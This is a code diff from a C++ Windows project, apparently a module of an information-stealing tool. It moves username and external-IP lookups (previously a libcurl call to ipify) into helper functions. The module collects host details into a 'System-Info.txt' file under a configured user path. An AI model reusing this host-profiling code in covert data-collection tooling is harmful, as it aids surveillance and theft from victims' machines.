@@ -24,6 +24,7 @@
 
 #include "../targets.h"
 #include "../../config/config.c"
+#include  "../../helper/helper.h"
 
 
 #include <windows.h>
@@ -97,13 +98,7 @@ void cursystem::GetSysInfo()
 {
 	printf("sys info\n");
 
-	TCHAR string[UNLEN + 1];
-	DWORD sizeit = UNLEN + 1;
-	GetUserName((TCHAR*)string, &sizeit);
-	std::wstring ws(string);
-	std::string userName(ws.begin(), ws.end());
-
-	std::string mainPath = "C:/Users/" + userName + config::path + "/System-Info/System-Info.txt";
+	std::string mainPath = "C:/Users/" + func::GetUser() + config::path + "/System-Info/System-Info.txt";
 
 	GetGeneralInfo();
 	CPU();
@@ -123,11 +118,6 @@ void cursystem::GetSysInfo()
 	file.close();
 }
 
-size_t WriteCallbackInfo(char* contents, size_t size, size_t nmemb, std::string* output) {
-	size_t totalSize = size * nmemb;
-	output->append(contents, totalSize);
-	return totalSize;
-}
 
 void GetGeneralInfo() 
 {
@@ -141,13 +131,7 @@ void GetGeneralInfo()
 
 	global::info += "Time and Date: " + timeString + '\n';
 
-	TCHAR s[UNLEN + 1];
-	DWORD sizethis = UNLEN + 1;
-	GetUserName((TCHAR*)s, &sizethis);
-	std::wstring ws(s);
-	std::string userName(ws.begin(), ws.end());
-
-	global::info += "User name: " + userName + '\n';
+	global::info += "User name: " + func::GetUser() + '\n';
 
 	TCHAR str[UNLEN + 1];
 	DWORD sizethis1 = UNLEN + 1;
@@ -217,23 +201,8 @@ void GetGeneralInfo()
 
 	global::info += "MAC Address: " + mac + '\n';
 
-	std::string ipAddress = "";
+	std::string ipAddress = func::GetIP();
 
-
-	CURL* curl = curl_easy_init();
-	if (curl) {
-		curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org");
-		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallbackInfo);
-		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &ipAddress);
-
-		CURLcode res = curl_easy_perform(curl);
-		if (res != CURLE_OK) {
-			std::cerr << "Failed to retrieve IP address: " << curl_easy_strerror(res) << std::endl;
-		}
-
-		curl_easy_cleanup(curl);
-	}
-	
 	global::info += "External IP Address: " + ipAddress + '\n';
 
 
